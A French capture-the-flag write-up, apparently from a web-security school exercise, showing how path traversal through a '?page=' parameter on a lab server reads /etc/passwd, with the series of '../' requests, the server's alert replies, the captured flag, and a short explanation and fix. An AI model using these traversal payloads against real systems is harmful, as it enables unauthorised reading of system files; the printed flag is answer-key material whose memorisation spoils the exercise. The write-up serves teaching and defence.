### Comment obtenir le flag
En allant sur n'importe quel page du site contenant une requete GET dans l'url (comme http://[ip]/?page=survey), on essaye de changer la valeur du parametre page.
On obtient alors un script alert. Cela nous donne l'idee d'utiliser une attaques de répertoires automatise avec un script python. (inspect_recursion.py)
Ce script va simplement essayer d'acceder au url du fichier /etc/passwd vu precedemment dans le dossier whatever, en rajoutant a chaque recursion un niveau de moins dans l'arborescence du serveur. Dans sa version finale, le script s'arrete quand l'alerte donne des indications sur le flag.
python3 inspect_recursion.py [ip]

http://192.168.43.129/?page=etc/passwd
alert('Wtf ?');

http://192.168.43.129/?page=../etc/passwd
alert('Wtf ?');

http://192.168.43.129/?page=../../etc/passwd
alert('Wrong..');

http://192.168.43.129/?page=../../../etc/passwd
alert('Nope..');

http://192.168.43.129/?page=../../../../etc/passwd
alert('Almost.');

http://192.168.43.129/?page=../../../../../etc/passwd
alert('Still nope..');

http://192.168.43.129/?page=../../../../../../etc/passwd
alert('Nope..');

http://192.168.43.129/?page=../../../../../../../etc/passwd
alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');

Nous avons donc le flag.

### Expliquer la faille
La traversée de répertoire ou Path Traversal est une attaque HTTP qui permet aux attaquants d'accéder à des répertoires restreints et d'exécuter des commandes en dehors du répertoire racine du serveur web.

### Comment la corriger
Premierement, verifier si la version du serveur web et des logiciels sont a jours, et que les patches ont ete appliques.
Ensuite, il est preferable de verifier les entrees utilisateur, idealement de supprimer tout ce qui ne fait pas parti des donnees correcte pour naviguer sur le site.
